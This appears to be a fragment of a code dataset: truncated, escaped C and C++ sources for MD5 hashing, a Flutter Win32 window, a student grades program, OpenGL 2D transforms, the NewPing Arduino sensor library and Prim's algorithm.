S41 6\n#define S42 10\n#define S43 15\n#define S44 21\n\nstatic void MD5Transform(UINT4[4], unsigned char[64]);\nstatic void Encode(unsigned char *, UINT4 *, unsigned int);\nstatic void Decode(UINT4 *, unsigned char *, unsigned int);\nstatic void MD5_memcpy(POINTER, POINTER, unsigned int);\nstatic void MD5_memset(POINTER, int, unsigned int);\n\nstatic unsigned char PADDING[64] = {0x80,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0,\n    0};\n\n/*\n * F, G, H and I are basic MD5 functions.\n */\n#define F(x, y, z) (((x) & (y)) | ((~x) & (z)))\n#define G(x, y, z) (((x) & (z)) | ((y) & (~z)))\n#define H(x, y, z) ((x) ^ (y) ^ (z))\n#define I(x, y, z) ((y) ^ ((x) | (~z)))\n\n/*\n * ROTATE_LEFT rotates x left n bits.\n */\n#define ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32 - (n))))\n\n/*\n * FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4. Rotation is\n * separate from addition to prevent recomputation.\n */\n#define FF(a, b, c, d, x, s, ac)                 \\\n  {                                              \\\n    (a) += F((b), (c), (d)) + (x) + (UINT4)(ac); \\\n    (a) = ROTATE_LEFT((a), (s));                 \\\n    (a) += (b);                                  \\\n  }\n#define GG(a, b, c, d, x, s, ac)                 \\\n  {                                              \\\n    (a) += G((b), (c), (d)) + (x) + (UINT4)(ac); \\\n    (a) = ROTATE_LEFT((a), (s));                 \\\n    (a) += (b);                                  \\\n  }\n#define HH(a, b, c, d, x, s, ac)                 \\\n  {                                              \\\n    (a) += H((b), (c), (d)) + (x) + (UINT4)(ac); \\\n    (a) = ROTATE_LEFT((a), (s));                 \\\n    (a) += (b);                                  \\\n  }\n#define II(a, b, c, d, x, s, ac)                 \\\n  {                                              \\\n    (a) += I((b), (c), (d)) + (x) + (UINT4)(ac); \\\n    (a) = ROTATE_LEFT((a), (s));                 \\\n    (a) += (b);                                  \\\n  }\n\n/*\n * MD5 initialization. Begins an MD5 operation, writing a new context.\n */\nvoid MD5Init(MD5_CTX *context)\n{\n  context->count[0] = context->count[1] = 0;\n  /*\n   * Load magic initialization constants.\n   */\n  context->state[0] = 0x67452301;\n  context->state[1] = 0xefcdab89;\n  context->state[2] = 0x98badcfe;\n  context->state[3] = 0x10325476;\n}\n\n/*\n * MD5 block update operation. Continues an MD5 message-digest operation,\n * processing another message block, and updating the context.\n */\nvoid MD5Update(MD5_CTX *context, unsigned char *input, unsigned int inputLen)\n{\n  unsigned int i, index, partLen;\n\n  /* Compute number of bytes mod 64 */\n  index = (unsigned int)((context->count[0] >> 3) & 0x3F);\n\n  /* update number of bits */\n  if ((context->count[0] += ((UINT4)inputLen << 3)) < ((UINT4)inputLen << 3))\n    context->count[1]++;\n  context->count[1] += ((UINT4)inputLen >> 29);\n\n  partLen = 64 - index;\n\n  /*\n   * Transform as many times as possible.\n   */\n  if (inputLen >= partLen) {\n    MD5_memcpy((POINTER)&context->buffer[index], (POINTER)input, partLen);\n    MD5Transform(context->state, context->buffer);\n\n    for (i = partLen; i + 63 < inputLen; i += 64)\n      MD5Transform(context->state, &input[i]);\n\n    index = 0;\n  } else\n    i = 0;\n\n  /* Buffer remaining input */\n  MD5_memcpy((POINTER)&context->buffer[index], (POINTER)&input[i], inputLen - i);\n}\n\n/*\n * MD5 finalization. Ends an MD5 message-digest operation, writing the the\n * message digest and zeroizing the context.\n */\nvoid MD5Final(unsigned char digest[16], MD5_CTX *context)\n{\n  unsigned char bits[8];\n  unsigned int  index, padLen;\n\n  /* Save number of bits */\n  Encode(bits, context->count, 8);\n\n  /*\n   * Pad out to 56 mod 64.\n   */\n  index  = (unsigned int)((context->count[0] >> 3) & 0x3f);\n  padLen = (index < 56) ? (56 - i",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<iostream>\r\n#include<fstream>\r\n#include<iomanip>\r\nusing namespace std;\r\n\r\nclass student\r\n{\r\n\tprivate:\r\n\t\t\r\n\tint rollno;\r\n\tchar name[50];\r\n\tint oop_marks, ds_marks, ca_marks, eng_marks, cs_marks;\r\n\tdouble per;    //stores average mark\r\n\tchar grade;    //stores grade obtained by the student\r\n\t\r\n\tpublic:\r\n\t\t\r\n\tvoid calculate();\t          // function to calculate grade\r\n\tvoid getdata();\t\t         // function to get data from user\r\n\tvoid showdata() const;\t    // function to display the data \r\n\tvoid show_tabular() const;  //function to display student details in tabular form\r\n\tint retrollno() const;      //function to return roll number\r\n\t\r\n}; \r\n\r\nvoid student::calculate()\r\n{\r\n\tper = (oop_marks + ds_marks + ca_marks + eng_marks + cs_marks) / 5.0;\r\n\t\r\n\tif(per>=80)\r\n\t\tgrade='A';\r\n\telse if(per>=70)\r\n\t\tgrade='B';\r\n\telse if(per>=50)\r\n\t\tgrade='C';\r\n\telse\r\n\t\tgrade='F';\r\n}\r\n\r\nvoid student::getdata()\r\n{\r\n\tcout<<\"\\nEnter the Roll number of student \"<<\"\\t\"<< \":\";\r\n\tcin>>rollno;\r\n\t\r\n\tcout<<\"\\n\\nEnter the Name of student \"<<\"\\t\\t\"<< \":\";\r\n\tcin.ignore();\r\n\tcin.getline(name,50);\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Object Oriented Programming \"<<\"\\t\"<< \":\" ;\r\n\tcin>>oop_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Data Structures \"<<\"\\t\\t\"<< \":\" ;\r\n\tcin>>ds_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Computer Architecture \"<<\"\\t\"<< \":\" ;\r\n\tcin>>ca_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in English  \"<<\"\\t\\t\\t\"<< \":\" ;\r\n\tcin>>eng_marks;\r\n\t\r\n\tcout<<\"\\nEnter the marks scored in Computer Science \"<<\"\\t\\t\"<< \":\" ;\r\n\tcin>>cs_marks;\r\n\tcalculate();\r\n}\r\n\r\nvoid student::showdata() const\r\n{\r\n\tcout<<\"\\n Student Roll number \"<<\"\\t\"<< \":\" <<rollno;\r\n\tcout<<\"\\n Student Name \"<<\"\\t\\t\"<< \":\"<<name;\r\n\t\r\n\tcout<<\"\\n\\n MARKS SCORED BY THE STUDENT: \\n\";\r\n\tcout<<\"----- ------ -- --- --------\\n\";\r\n\t\r\n\tcout<<\"\\n Object Oriented Programming    :\"<<oop_marks;\r\n\tcout<<\"\\n Data Structures  \"<<\"\\t\\t\"<< \":\" <<ds_marks;\r\n\tcout<<\"\\n Computer Architecture  \"<<\"\\t\"<< \":\" <<ca_marks;\r\n\tcout<<\"\\n English \"<<\"\\t\\t\\t\"<< \":\"<<eng_marks;\r\n\tcout<<\"\\n Computer Science \"<<\"\\t\\t\"<< \":\"<<cs_marks;\r\n\t\r\n\tcout<<\"\\n\\n Percentage     :\"<<per;\r\n\tcout<<\"\\n Grade  \"<<\"\\t\"<< \":\"<<grade;\r\n}\r\n\r\nvoid student::show_tabular() const\r\n{\r\n\tcout<<rollno<<setw(6)<<\"\\t\"<<name<<setw(10)<<\"\\t\"<<oop_marks<<setw(4)<<\"\\t\"<<ds_marks<<setw(4)<<\"\\t\"<<ca_marks<<setw(4)<<\"\\t\"\r\n\t\t<<eng_marks<<setw(4)<<\"\\t\"<<cs_marks<<setw(8)<<\"\"<<per<<setw(6)<<\"\\t\"<<grade<<endl;\r\n}\r\n\r\nint  student::retrollno() const\r\n{\r\n\treturn rollno;\r\n}\r\n\r\n/* function declaration */\r\n\r\nvoid write_student();\t        // function to write the record in binary file\r\nvoid display_all();\t           // function to read records from binary file\r\nvoid display_sp(int);\t      // function to display specific record from binary file\r\nvoid modify_student(int);    // function to update record of binary file\r\nvoid delete_student(int);\t//function to delete selected records from binary file\r\nvoid class_result();\t   //function to display all records in tabular format \r\nvoid result();\t\t      //function to display result \r\nvoid intro();\t\t     //function to display welcome screen\r\nvoid entry_menu();\t    //function to display entry menu on screen\r\n\r\n\r\n\r\nint main()\r\n{\r\n\tchar ch;\r\n\tcout.setf(ios::fixed|ios::showpoint);\r\n\tcout<<setprecision(2);      // program outputs decimal number to two decimal places\r\n\tintro();\r\n\tdo\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\t\tcout<<\"\\n\\n\\n\\t MAIN MENU\";\r\n\t\tcout<<\"\\n\\t ---- -----\";\r\n\t\t\r\n\t\tcout<<\"\\n\\n\\t 1. ENTRY/EDIT MENU \";\r\n\t\tcout<<\"\\n\\n\\t 2. RESULT MENU \";\r\n\t\tcout<<\"\\n\\n\\t 3. EXIT \";\r\n\t\tcout<<\"\\n\\n\\n\\t Please Select Your Option  \";\r\n\t\tcin>>ch;\r\n\t\tswitch(ch)\r\n\t\t{\r\n\t\t\tcase '1': entry_menu();\r\n\t\t\t\tbreak;\r\n\t\t\tcase '2': result();\r\n\t\t\t\tbreak;\r\n\t\t\tcase '3':\r\n\t\t\t\tbreak;\r\n\t\t\tdefault :cout<<\"\\a\";\r\n\t\t}\r\n    }while(ch!='3');\r\n\treturn 0;\r\n}\r\n\r\n\r\n/*  function to write in file  */\r\n\r\nvoid write_student()\r\n{\r\n\tstudent st;\r\n\tofstream outFile;\r\n\toutFile.open(\"student.dat\",ios::binary|ios::app);\r\n\tst.getdata();\r\n\toutFile.write(reinterpret_cast<char *> (&st), sizeof(student));\r\n\toutFile.close();\r\n    cout<<\"\\n\\nStudent record Has Been Created \";\r\n\tcin.ignore();\r\n\tcin.get();\r\n}\r\n\r\n\r\n/*  function to read all records from file  */\r\n\r\nvoid display_all()\r\n{\r\n\tstudent st;\r\n\tifstream inFile;\r\n\tinFile.open(\"student.dat\",ios::binary);\r\n\tif(!inFile)\r\n\t{\r\n\t\tcout<<\"File could not be open !! Press any Key...\";\r\n\t\tcin.ignore();\r\n\t\tcin.get();\r\n\t\treturn;\r\n\t}\r\n\tcout<<\"\\n\\n\\n\\t\\t ALL STUDENTS RECORD. \\n\\n\";\r\n\twhile(inFile.read(reinterpret_cast<char *> (&st), sizeof(student)))\r\n\t{\r\n\t\tst.showdata();\r\n\t\tcout<<\"\\n\\n_________\\n\";\r\n\t}\r\n\tinFile.close();\r\n\tcin.ignore();\r\n\tcin.get();\r\n}\r\n\r\n\r\n/*  function to read specific record from file  */\r\n\r\nvoid display_sp(int n)\r\n{\r\n\tstudent st;\r\n\tifstream inFile;\r\n\tinFile.open(\"student.dat\",ios::binary);\r\n\tif(!inFile)\r\n\t{\r\n\t\tcout<<\"File could not be open !! Press any Key...\";\r\n\t\tcin.ignore();\r\n\t\tcin.get();\r\n\t\treturn;\r\n\t}\r\n\tbool flag=false;\r\n\twhile(inFile.read(reinterpret_cast<char *> (&st), sizeof(student)))\r\n\t{\r\n\t\tif(st.retroll",
    "/*Program 6 - Implement following 2D transformations on the object with respect to axis : \u2013\r\n i) Scaling ii) Reflection */\r\n\r\n#include <iostream>\r\n#include <math.h>\r\n#include <time.h>\r\n#include <GL/glut.h>\r\n#include <vector>\r\nusing namespace std;\r\nint edge;\r\nvector<int> xpoint;\r\nvector<int> ypoint;\r\nint ch;\r\ndouble round(double d){\r\nreturn floor(d + 0.5);\r\n}\r\nvoid init(){\r\nglClearColor(1.0,1.0,1.0,0.0);\r\nglMatrixMode(GL_PROJECTION);\r\ngluOrtho2D(0,640,0,480);\r\nglClear(GL_COLOR_BUFFER_BIT);\r\n}\r\nvoid scale(){\r\nglColor3f(1.0,0,0);\r\nglBegin(GL_POLYGON);\r\nfor(int i=0;i<edge;i++)\r\n{\r\nglVertex2i(xpoint[i]-320,ypoint[i]-240);\r\n}\r\nglEnd();\r\nglFlush();\r\ncout<<\"\\n\\tIn Scaling whole screen is 1st Qudrant \\n\";\r\nint sx, sy;\r\ncout<<\"\\t Enter sx, sy \\n\";\r\ncin>> sx>> sy;\r\n//scale the point\r\nfor(int i=0;i<edge;i++){\r\nxpoint[i] = (xpoint[i]-320) * sx;\r\nypoint[i] = (ypoint[i]-240) * sy;\r\n}\r\nglColor3f(0,0,1.0);\r\nglBegin(GL_POLYGON);\r\nfor(int i=0;i<edge;i++){\r\nglVertex2i(xpoint[i],ypoint[i]);\r\n}\r\nglEnd();\r\nglFlush();\r\n}\r\nvoid reflection(){\r\nchar reflection;\r\ncout<<\"Enter Reflection Axis \\n\";\r\ncin>> reflection;\r\nif(reflection == 'x' || reflection == 'X'){\r\nglColor3f(0.0,0.0,1.0);\r\nglBegin(GL_POLYGON);\r\nfor(int i=0;i<edge;i++){\r\nglVertex2i(xpoint[i], (ypoint[i] * -1)+480);\r\n}\r\nglEnd();\r\nglFlush();\r\n}\r\nelse if(reflection == 'y' || reflection == 'Y'){\r\nglColor3f(0.0,0.0,1.0);\r\nglBegin(GL_POLYGON);\r\nfor(int i=0;i<edge;i++){\r\nglVertex2i((xpoint[i] * -1)+640,(ypoint[i]));\r\n}\r\nglEnd();\r\nglFlush();\r\n}\r\n}\r\nvoid Draw(){\r\nif(ch==2 || ch==3 || ch==4){\r\nglColor3f(1.0,0,0);\r\nglBegin(GL_LINES);\r\nglVertex2i(0,240);\r\nglVertex2i(640,240);\r\nglEnd();\r\nglColor3f(1.0,0,0);\r\nglBegin(GL_LINES);\r\nglVertex2i(320,0);\r\nglVertex2i(320,480);\r\nglEnd();\r\nglFlush();\r\nglColor3f(1.0,0,0);\r\nglBegin(GL_POLYGON);\r\nfor(int i=0;i<edge;i++){\r\nglVertex2i(xpoint[i],ypoint[i]);\r\n}\r\nglEnd();\r\nglFlush();\r\n}\r\nif(ch==1){\r\nscale();\r\n}\r\nelse if( ch == 2){\r\nreflection();\r\n}\r\n}\r\nint main(int argc, char** argv){\r\ncout<<\"\\n \\t Enter 1) Scaling \";\r\ncout<<\"\\n \\t Enter 2) Reflection\";\r\ncin>>ch;\r\nif(ch==1 || ch==2 ){\r\ncout<<\"Enter No of edges \\n\";\r\ncin>> edge;\r\n\r\nint xpointnew, ypointnew;\r\ncout<<\" Enter\"<< edge <<\" point of polygon \\n\";\r\nfor(int i=0;i<edge;i++){\r\ncout<<\"Enter \"<< i << \" Point \";\r\ncin>>xpointnew>>ypointnew;\r\nxpoint.push_back(xpointnew+320);\r\nypoint.push_back(ypointnew+240);\r\n}\r\nglutInit(&argc, argv);\r\nglutInitDisplayMode(GLUT_SINGLE|GLUT_RGB);\r\nglutInitWindowSize(640,480);\r\nglutInitWindowPosition(200,200);\r\nglutCreateWindow(\"2D\");\r\ninit();\r\nglutDisplayFunc(Draw);\r\nglutMainLoop();\r\nreturn 0;\r\n}\r\n}\r\n/*Output:\r\nEnter No of edges \r\n3\r\n Enter3 point of polygon \r\nEnter 0 Point 10 20\r\nEnter 1 Point 90 20\r\nEnter 2 Point 40 80\r\n\r\n\tIn Scaling whole screen is 1st Qudrant \r\n\t Enter sx, sy \r\n2 5\r\n\r\n*/\r\n",
    "// ---------------------------------------------------------------------------\n// Created by Tim Eckel - eckel.tim@gmail.com\n//\n// See NewPing.h for license, purpose, syntax, version history, links, etc.\n// ---------------------------------------------------------------------------\n\n#include \"NewPing.h\"\n\n\n// ---------------------------------------------------------------------------\n// NewPing constructor\n// ---------------------------------------------------------------------------\n\nNewPing::NewPing(uint8_t trigger_pin, uint8_t echo_pin, unsigned int max_cm_distance) {\n#if DO_BITWISE == true\n\t_triggerBit = digitalPinToBitMask(trigger_pin); // Get the port register bitmask for the trigger pin.\n\t_echoBit = digitalPinToBitMask(echo_pin);       // Get the port register bitmask for the echo pin.\n\n\t_triggerOutput = portOutputRegister(digitalPinToPort(trigger_pin)); // Get the output port register for the trigger pin.\n\t_echoInput = portInputRegister(digitalPinToPort(echo_pin));         // Get the input port register for the echo pin.\n\n\t_triggerMode = (uint8_t *) portModeRegister(digitalPinToPort(trigger_pin)); // Get the port mode register for the trigger pin.\n#else\n\t_triggerPin = trigger_pin;\n\t_echoPin = echo_pin;\n#endif\n\t_one_pin_mode = (trigger_pin == echo_pin); // Automatic one pin mode detection per sensor.\n\n\tset_max_distance(max_cm_distance); // Call function to set the max sensor distance.\n\n#if (defined(__arm__) && (defined(TEENSYDUINO) || defined(PARTICLE))) || defined(ARDUINO_AVR_YUN) || DO_BITWISE != true\n\tpinMode(echo_pin, INPUT);     // Set echo pin to input (on Teensy 3.x (ARM), pins default to disabled, at least one pinMode() is needed for GPIO mode).\n\tpinMode(trigger_pin, OUTPUT); // Set trigger pin to output (on Teensy 3.x (ARM), pins default to disabled, at least one pinMode() is needed for GPIO mode).\n#endif\n\n#if DO_BITWISE == true\n\t*_triggerMode |= _triggerBit;    // Set trigger pin to output.\n\t*_triggerOutput &= ~_triggerBit; // Trigger pin should already be low, but set to low to make sure.\n#else\n\tdigitalWrite(_triggerPin, LOW);  // Trigger pin should already be low, but set to low to make sure.\n#endif\n}\n\n\n// ---------------------------------------------------------------------------\n// Standard ping methods\n// ---------------------------------------------------------------------------\n\nunsigned int NewPing::ping(unsigned int max_cm_distance) {\n\tif (max_cm_distance > 0) set_max_distance(max_cm_distance); // Call function to set a new max sensor distance.\n\n\tif (!ping_trigger()) return NO_ECHO; // Trigger a ping, if it returns false, return NO_ECHO to the calling function.\n\n#if URM37_ENABLED == true\n\t#if DO_BITWISE == true\n\t\twhile (!(*_echoInput & _echoBit)) // Wait for the ping echo.\n\t#else\n\t\twhile (!digitalRead(_echoPin))    // Wait for the ping echo.\n\t#endif\n\t\t\tif (micros() > _max_time) return NO_ECHO; // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\n#else\n\t#if DO_BITWISE == true\n\t\twhile (*_echoInput & _echoBit)    // Wait for the ping echo.\n\t#else\n\t\twhile (digitalRead(_echoPin))     // Wait for the ping echo.\n\t#endif\n\t\t\tif (micros() > _max_time) return NO_ECHO; // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\n#endif\n\n\treturn (micros() - (_max_time - _maxEchoTime) - PING_OVERHEAD); // Calculate ping time, include overhead.\n}\n\n\nunsigned long NewPing::ping_cm(unsigned int max_cm_distance) {\n\tunsigned long echoTime = NewPing::ping(max_cm_distance); // Calls the ping method and returns with the ping echo distance in uS.\n#if ROUNDING_ENABLED == false\n\treturn (echoTime / US_ROUNDTRIP_CM);              // Call the ping method and returns the distance in centimeters (no rounding).\n#else\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_CM); // Convert uS to centimeters.\n#endif\n}\n\n\nunsigned long NewPing::ping_in(unsigned int max_cm_distance) {\n\tunsigned long echoTime = NewPing::ping(max_cm_distance); // Calls the ping method and returns with the ping echo distance in uS.\n#if ROUNDING_ENABLED == false\n\treturn (echoTime / US_ROUNDTRIP_IN);              // Call the ping method and returns the distance in inches (no rounding).\n#else\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_IN); // Convert uS to inches.\n#endif\n}\n\n\nunsigned long NewPing::ping_median(uint8_t it, unsigned int max_cm_distance) {\n\tunsigned int uS[it], last;\n\tuint8_t j, i = 0;\n\tunsigned long t;\n\tuS[0] = NO_ECHO;\n\n\tif (max_cm_distance > 0) set_max_distance(max_cm_distance); // Call function to set a new max sensor distance.\n\n\twhile (i < it) {\n\t\tt = micros();          // Start ping timestamp.\n\t\tlast = ping();         // Send ping.\n\n\t\tif (last != NO_ECHO) { // Ping in range, include as part of median.\n\t\t\tif (i > 0) {       // Don't start sort till second ping.\n\t\t\t\tfor (j = i; j > 0 && uS[j - 1] < last; j--) // Insertion sort loop.\n\t\t\t\t\tuS[j] = uS[j - 1];                      // Shift ping array to correct position for sort insertion.\n\t\t\t} else j = 0;      // First ping is s",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nclass tree\r\n{\r\n\tint a[20][20],l,u,w,i,j,v,e,visited[20];\r\npublic:\r\n\t\tvoid input();\r\n\t\tvoid display();\r\n\t\tvoid minimum();\r\n};\r\n\r\nvoid tree::input()\r\n{\r\n\tcout<<\"Enter the no. of branches: \";\r\n\tcin>>v;\r\n\r\n\tfor(i=0;i<v;i++)\r\n\t{\r\n\t\tvisited[i]=0;\r\n\t\tfor(j=0;j<v;j++)\r\n\t\t{\r\n\t\t\ta[i][j]=999;\r\n\t\t}\r\n\t}\r\n\r\n\tcout<<\"\\nEnter the no. of connections: \";\r\n\tcin>>e;\r\n\r\n\tfor(i=0;i<e;i++)\r\n\t{\r\n\t\tcout<<\"Enter the end branches of connections:  \"<<endl;\r\n\t\tcin>>l>>u;\r\n\t\tcout<<\"Enter the phone company charges for this connection:  \";\r\n\t\tcin>>w;\r\n\t\ta[l-1][u-1]=a[u-1][l-1]=w;\r\n\t}\r\n}\r\n\r\nvoid tree::display()\r\n{\r\n\tcout<<\"\\nAdjacency matrix:\";\r\n\tfor(i=0;i<v;i++)\r\n\t{\r\n\t\tcout<<endl;\r\n\t\tfor(j=0;j<v;j++)\r\n\t\t{\r\n\t\t\tcout<<a[i][j]<<\"   \";\r\n\t\t}\r\n\t\tcout<<endl;\r\n\t}\r\n}\r\n\r\nvoid tree::minimum()\r\n{\r\n\tint p=0,q=0,total=0,min;\r\n\tvisited[0]=1;\r\n\tfor(int count=0;count<(v-1);count++)\r\n\t{\r\n\t\tmin=999;\r\n\t\tfor(i=0;i<v;i++)\r\n\t\t{\r\n\t\t\tif(visited[i]==1)\r\n\t\t\t{\r\n\t\t\t\tfor(j=0;j<v;j++)\r\n\t\t\t\t{\r\n\t\t\t\t\tif(visited[j]!=1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tif(min > a[i][j])\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tmin=a[i][j];\r\n\t\t\t\t\t\t\tp=i;\r\n\t\t\t\t\t\t\tq=j;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tvisited[p]=1;\r\n\t\tvisited[q]=1;\r\n\t\ttotal=total + min;\r\n\t\tcout<<\"Minimum cost connection is\"<<(p+1)<<\" -> \"<<(q+1)<<\"  with charge : \"<<min<< endl;\r\n\t\t\r\n\t}\r\n\tcout<<\"The minimum total cost of connections of all branches is: \"<<total<<endl;\r\n}\r\n\r\nint main()\r\n{\r\n\tint ch;\r\n\ttree t;\r\n\tdo\r\n\t{\r\n\t\tcout<<\"==========PRIM'S ALGORITHM=================\"<<endl;\r\n\t\tcout<<\"\\n1.INPUT\\n \\n2.DISPLAY\\n \\n3.MINIMUM\\n\"<<endl;\r\n\t\tcout<<\"Enter your choice :\"<<endl;\r\n\t\tcin>>ch;\r\n\t\r\n\tswitch(ch)\r\n\t{\t\r\n\tcase 1: cout<<\"*******INPUT YOUR VALUES*******\"<<endl;\t\r\n\t\tt.input();\r\n\t\tbreak;\r\n\r\n\tcase 2: cout<<\"*******DISPLAY THE CONTENTS********\"<<endl;\r\n\t\tt.display();\r\n\t\tbreak;\r\n\r\n\tcase 3: cout<<\"*********MINIMUM************\"<<endl;\r\n\t\tt.minimum();\r\n\t\tbreak;\r\n\t}\r\n\t\r\n\t}while(ch!=4);\r\n\treturn 0;\r\n}\r\n\r\n\r\nOutput :-\r\n==========PRIM'S ALGORITHM=================\r\n\r\n1.INPUT\r\n \r\n2.DISPLAY\r\n \r\n3.MINIMUM\r\n\r\nEnter your choice :\r\n1\r\n*******INPUT YOUR VALUES*******\r\nEnter the no. of branches: 4\r\n\r\nEnter the no. of connections: 5\r\nEnter the end branches of connections:  \r\n1\r\n2\r\nEnter the phone company charges for this connection:  150\r\nEnter the end branches of connections:  \r\n1\r\n3\r\nEnter the phone company charges for this connection:  200\r\nEnter the end branches of connections:  \r\n2\r\n3\r\nEnter the phone company charges for this connection:  250\r\nEnter the end branches of connections:  \r\n3\r\n4\r\nEnter the phone company charges for this connection:  450\r\nEnter the end branches of connections:  \r\n2\r\n4\r\nEnter the phone company charges for this connection:  550\r\n==========PRIM'S ALGORITHM=================\r\n\r\n1.INPUT\r\n \r\n2.DISPLAY\r\n \r\n3.MINIMUM\r\n\r\nEnter your choice :\r\n2\r\n*******DISPLAY THE CONTENTS********\r\n\r\nAdjacency matrix:\r\n999   150   200   999   \r\n\r\n150   999   250   550   \r\n\r\n200   250   999   450   \r\n\r\n999   550   450   999   \r\n==========PRIM'S ALGORITHM=================\r\n\r\n1.INPUT\r\n \r\n2.DISPLAY\r\n \r\n3.MINIMUM\r\n\r\nEnter your choice :\r\n3\r\n*********MINIMUM************\r\nMinimum cost connection is1 -> 2  with charge : 150\r\nMinimum cost 